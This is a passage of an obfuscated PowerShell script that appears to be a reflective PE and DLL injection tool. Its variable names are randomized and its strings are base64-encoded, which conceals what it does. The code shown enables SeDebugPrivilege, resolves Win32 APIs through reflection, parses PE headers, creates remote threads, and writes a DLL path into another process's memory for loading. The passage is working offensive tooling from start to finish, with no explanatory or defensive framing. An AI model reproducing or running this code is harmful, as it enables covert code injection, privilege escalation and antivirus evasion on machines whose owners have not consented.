        ${ab80cc47d1ab4d329ee62d6f40f865dc} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${d224ba1010334e1da6c79c98346c2f99}.GetType()) * 2
        ${eb5a4c368ff24bdc9fe9bb49c6559eb0} = "0x{0:X$(${ab80cc47d1ab4d329ee62d6f40f865dc})}" -f [Int64]${d224ba1010334e1da6c79c98346c2f99} 
        return ${eb5a4c368ff24bdc9fe9bb49c6559eb0}
    }
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${ad0937a6b5514403a124ef387e801a35},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${a6f1c45867c645738edd3413cf0d7718},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${cf3b0c7ec8154434be540fb42c7d8bc2},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${ec6af79a1f4140bf9022e4a98471da5e}
		)
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned (${cf3b0c7ec8154434be540fb42c7d8bc2}) (${ec6af79a1f4140bf9022e4a98471da5e}))
		${63fbd3ce556a4675a4faeac6be3e4b08} = ${a6f1c45867c645738edd3413cf0d7718}.EndAddress
		if ((Compare-Val1GreaterThanVal2AsUInt (${a6f1c45867c645738edd3413cf0d7718}.PEHandle) (${cf3b0c7ec8154434be540fb42c7d8bc2})) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. ${ad0937a6b5514403a124ef387e801a35}"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) (${63fbd3ce556a4675a4faeac6be3e4b08})) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. ${ad0937a6b5514403a124ef387e801a35}"
		}
	}
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${bf800d3fa83245d1b619eccd7ab95bf1},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${ed8e2beac355444db175543089c05e66}
		)
		for (${f7c496a6228a41b7a64d4d4196bb9962} = 0; ${f7c496a6228a41b7a64d4d4196bb9962} -lt ${bf800d3fa83245d1b619eccd7ab95bf1}.Length; ${f7c496a6228a41b7a64d4d4196bb9962}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${ed8e2beac355444db175543089c05e66}, ${f7c496a6228a41b7a64d4d4196bb9962}, ${bf800d3fa83245d1b619eccd7ab95bf1}[${f7c496a6228a41b7a64d4d4196bb9962}])
		}
	}
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${d1cf6e292bf24e7ab40052342dacf7e7} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${afa2ac2f6968446891f7370dd892e3de} = [Void]
	    )
	    ${e564496d52b5421aab078e6f36a45254} = [AppDomain]::CurrentDomain
	    ${60160d3783a34cff807e4750da1095b6} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${21585474783d42b6bd0e0039fcee7f5e} = ${e564496d52b5421aab078e6f36a45254}.DefineDynamicAssembly(${60160d3783a34cff807e4750da1095b6}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${ee2479f604eb42af9bd823448f5f2d6a} = ${21585474783d42b6bd0e0039fcee7f5e}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${b2771a971484429181a6c0ce61f2f9c0} = ${55580d7c42de426c918d2e3e90cfdb71}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${d1cf6e292bf24e7ab40052342dacf7e7})
	    ${b2771a971484429181a6c0ce61f2f9c0}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${fe75a67b31074a328c9a1717f5e8706e} = ${55580d7c42de426c918d2e3e90cfdb71}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${afa2ac2f6968446891f7370dd892e3de}, ${d1cf6e292bf24e7ab40052342dacf7e7})
	    ${fe75a67b31074a328c9a1717f5e8706e}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
	}
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${a576ec094b1a49acb75d200c639d4352},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${c172413400694647b9928b4bf60386da}
	    )
	    ${d942115920f3407191f81471694a63bf} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${f933f94f92bd43caa69bf1bdc282dcca} = ${d942115920f3407191f81471694a63bf}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${2e242b91c2be432ca3fc1d1f192dd1ba} = ${f933f94f92bd43caa69bf1bdc282dcca}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${29977385ee5948fb90dc98d028bf9053} = ${f933f94f92bd43caa69bf1bdc282dcca}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
	    ${c4e50b80239b4c959269ae6f82067523} = ${2e242b91c2be432ca3fc1d1f192dd1ba}.Invoke($null, @(${a576ec094b1a49acb75d200c639d4352}))
	    ${6b93b1ae22c3474c87481b7302fa9ca6} = New-Object IntPtr
	    ${81c072e863b1472f8611a3cb3d17f526} = New-Object System.Runtime.InteropServices.HandleRef(${6b93b1ae22c3474c87481b7302fa9ca6}, ${c4e50b80239b4c959269ae6f82067523})
	    echo ${29977385ee5948fb90dc98d028bf9053}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${81c072e863b1472f8611a3cb3d17f526}, ${c172413400694647b9928b4bf60386da}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${e68f649120fc4868841a2d8eea9e08f5},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${e39002e42e324234be4b9268daddc239},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${a851be47767a4e43b58c4498cda85d23}
		)
		[IntPtr]$ThreadHandle = ${e68f649120fc4868841a2d8eea9e08f5}.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.OpenThreadToken.Invoke($ThreadHandle, ${a851be47767a4e43b58c4498cda85d23}.TOKEN_QUERY -bor ${a851be47767a4e43b58c4498cda85d23}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if (${ad4a1ce275f0418bb89955c7769f006a} -eq $false)
		{
			${486ccfd693b846e19275573b2f81b9e7} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${486ccfd693b846e19275573b2f81b9e7} -eq ${a851be47767a4e43b58c4498cda85d23}.ERROR_NO_TOKEN)
			{
				${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.ImpersonateSelf.Invoke(3)
				if (${ad4a1ce275f0418bb89955c7769f006a} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.OpenThreadToken.Invoke($ThreadHandle, ${a851be47767a4e43b58c4498cda85d23}.TOKEN_QUERY -bor ${a851be47767a4e43b58c4498cda85d23}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if (${ad4a1ce275f0418bb89955c7769f006a} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: ${486ccfd693b846e19275573b2f81b9e7}"
			}
		}
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${e39002e42e324234be4b9268daddc239}.LUID))
		${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), $PLuid)
		if (${ad4a1ce275f0418bb89955c7769f006a} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${e39002e42e324234be4b9268daddc239}.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		${d80f178086ac4afe9a82c5e8be968997} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]${e39002e42e324234be4b9268daddc239}.TOKEN_PRIVILEGES)
		${d80f178086ac4afe9a82c5e8be968997}.PrivilegeCount = 1
		${d80f178086ac4afe9a82c5e8be968997}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]${e39002e42e324234be4b9268daddc239}.LUID)
		${d80f178086ac4afe9a82c5e8be968997}.Privileges.Attributes = ${a851be47767a4e43b58c4498cda85d23}.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${d80f178086ac4afe9a82c5e8be968997}, $TokenPrivilegesMem, $true)
		${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		${486ccfd693b846e19275573b2f81b9e7} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${ad4a1ce275f0418bb89955c7769f006a} -eq $false) -or (${486ccfd693b846e19275573b2f81b9e7} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${ae1e830f808141fc83d07d13d133dd73},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${cf3b0c7ec8154434be540fb42c7d8bc2},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${c4ed07bb07b94101b05bf762b53447d9} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		${e68f649120fc4868841a2d8eea9e08f5}
		)
		[IntPtr]${460cfed693c74a6aa5ec2d93b226df0e} = [IntPtr]::Zero
		${9ff9e0d78f5c460e8fb21ab34e0eee58} = [Environment]::OSVersion.Version
		if ((${9ff9e0d78f5c460e8fb21ab34e0eee58} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${9ff9e0d78f5c460e8fb21ab34e0eee58} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
		{
			${e8d8128aaf11497f8b4762a41891f932}= ${e68f649120fc4868841a2d8eea9e08f5}.NtCreateThreadEx.Invoke([Ref]${460cfed693c74a6aa5ec2d93b226df0e}, 0x1FFFFF, [IntPtr]::Zero, ${ae1e830f808141fc83d07d13d133dd73}, ${cf3b0c7ec8154434be540fb42c7d8bc2}, ${c4ed07bb07b94101b05bf762b53447d9}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${87d2f9296751491aa26ab8074e23e8b0} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${460cfed693c74a6aa5ec2d93b226df0e} -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: ${e8d8128aaf11497f8b4762a41891f932}. LastError: ${87d2f9296751491aa26ab8074e23e8b0}"
			}
		}
		else
		{
			${460cfed693c74a6aa5ec2d93b226df0e} = ${e68f649120fc4868841a2d8eea9e08f5}.CreateRemoteThread.Invoke(${ae1e830f808141fc83d07d13d133dd73}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${cf3b0c7ec8154434be540fb42c7d8bc2}, ${c4ed07bb07b94101b05bf762b53447d9}, 0, [IntPtr]::Zero)
		}
		if (${460cfed693c74a6aa5ec2d93b226df0e} -eq [IntPtr]::Zero)
		{
			Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA'))) -ErrorAction Stop
		}
		return ${460cfed693c74a6aa5ec2d93b226df0e}
	}
	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${dd4b2676e8224a01aaf12b89b05f1b62},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${e39002e42e324234be4b9268daddc239}
		)
		${5b6d92dd63204312a6afe61200b21bdf} = New-Object System.Object
		${17337b8ce21a4229a21a1e2388749dca} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${dd4b2676e8224a01aaf12b89b05f1b62}, [Type]${e39002e42e324234be4b9268daddc239}.IMAGE_DOS_HEADER)
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${dd4b2676e8224a01aaf12b89b05f1b62}) ([Int64][UInt64]${17337b8ce21a4229a21a1e2388749dca}.e_lfanew))
		${5b6d92dd63204312a6afe61200b21bdf} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		${ebf122058d0b4be288842634bc912d2e} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]${e39002e42e324234be4b9268daddc239}.IMAGE_NT_HEADERS64)
	    if (${ebf122058d0b4be288842634bc912d2e}.Signature -ne 0x00004550)
	    {
	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${ebf122058d0b4be288842634bc912d2e}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${5b6d92dd63204312a6afe61200b21bdf} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${ebf122058d0b4be288842634bc912d2e}
			${5b6d92dd63204312a6afe61200b21bdf} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${28d5942dd27d495d835828ea8bf8f510} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]${e39002e42e324234be4b9268daddc239}.IMAGE_NT_HEADERS32)
			${5b6d92dd63204312a6afe61200b21bdf} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${28d5942dd27d495d835828ea8bf8f510}
			${5b6d92dd63204312a6afe61200b21bdf} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${5b6d92dd63204312a6afe61200b21bdf}
	}
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${dd84f627e34042a19d0e69bbfb56125d},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${e39002e42e324234be4b9268daddc239}
		)
		${a6f1c45867c645738edd3413cf0d7718} = New-Object System.Object
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${dd84f627e34042a19d0e69bbfb56125d}.Length)
		[System.Runtime.InteropServices.Marshal]::Copy(${dd84f627e34042a19d0e69bbfb56125d}, 0, $UnmanagedPEBytes, ${dd84f627e34042a19d0e69bbfb56125d}.Length) | Out-Null
		${5b6d92dd63204312a6afe61200b21bdf} = Get-ImageNtHeaders -dd4b2676e8224a01aaf12b89b05f1b62 $UnmanagedPEBytes -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239}
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${5b6d92dd63204312a6afe61200b21bdf}.PE64Bit)
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${5b6d92dd63204312a6afe61200b21bdf}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${5b6d92dd63204312a6afe61200b21bdf}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${5b6d92dd63204312a6afe61200b21bdf}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${5b6d92dd63204312a6afe61200b21bdf}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		return ${a6f1c45867c645738edd3413cf0d7718}
	}
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${dd4b2676e8224a01aaf12b89b05f1b62},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${e39002e42e324234be4b9268daddc239},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${a851be47767a4e43b58c4498cda85d23}
		)
		if (${dd4b2676e8224a01aaf12b89b05f1b62} -eq $null -or ${dd4b2676e8224a01aaf12b89b05f1b62} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${a6f1c45867c645738edd3413cf0d7718} = New-Object System.Object
		${5b6d92dd63204312a6afe61200b21bdf} = Get-ImageNtHeaders -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239}
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${dd4b2676e8224a01aaf12b89b05f1b62}
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${5b6d92dd63204312a6afe61200b21bdf}.IMAGE_NT_HEADERS)
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${5b6d92dd63204312a6afe61200b21bdf}.NtHeadersPtr)
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${5b6d92dd63204312a6afe61200b21bdf}.PE64Bit)
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${5b6d92dd63204312a6afe61200b21bdf}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${a6f1c45867c645738edd3413cf0d7718}.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${e39002e42e324234be4b9268daddc239}.IMAGE_NT_HEADERS64)))
			${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${e39002e42e324234be4b9268daddc239}.IMAGE_NT_HEADERS32)))
			${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		if ((${5b6d92dd63204312a6afe61200b21bdf}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_FILE_DLL) -eq ${a851be47767a4e43b58c4498cda85d23}.IMAGE_FILE_DLL)
		{
			${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${5b6d92dd63204312a6afe61200b21bdf}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_FILE_EXECUTABLE_IMAGE) -eq ${a851be47767a4e43b58c4498cda85d23}.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${a6f1c45867c645738edd3413cf0d7718}
	}
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${dbc8e071ba554a5991d5c23be7628337},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${bf4870283e054bd5833aafc59cdaeed1}
		)
		${316b88f6ef8c400aac88c3cceb745ea2} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${7e24bc57bb2942989bb237b7e87a010f} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${bf4870283e054bd5833aafc59cdaeed1})
		${ccf1c9b330644e67967ea2718117fb9b} = [UIntPtr][UInt64]([UInt64]${7e24bc57bb2942989bb237b7e87a010f}.Length + 1)
		${4d3bd764044f493ab1d6069f1721758a} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAllocEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, [IntPtr]::Zero, ${ccf1c9b330644e67967ea2718117fb9b}, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_READWRITE)
		if (${4d3bd764044f493ab1d6069f1721758a} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.WriteProcessMemory.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${4d3bd764044f493ab1d6069f1721758a}, ${bf4870283e054bd5833aafc59cdaeed1}, ${ccf1c9b330644e67967ea2718117fb9b}, [Ref]$NumBytesWritten)
		if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${ccf1c9b330644e67967ea2718117fb9b} -ne $NumBytesWritten)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${81f04b18eb70444ab2797c3a533e47a1} = ${e68f649120fc4868841a2d8eea9e08f5}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${1d14c3f41cc541fbb15e2761bee7a962} = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke(${81f04b18eb70444ab2797c3a533e47a1}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]$DllAddress = [IntPtr]::Zero
		if (${a6f1c45867c645738edd3413cf0d7718}.PE64Bit -eq $true)
		{
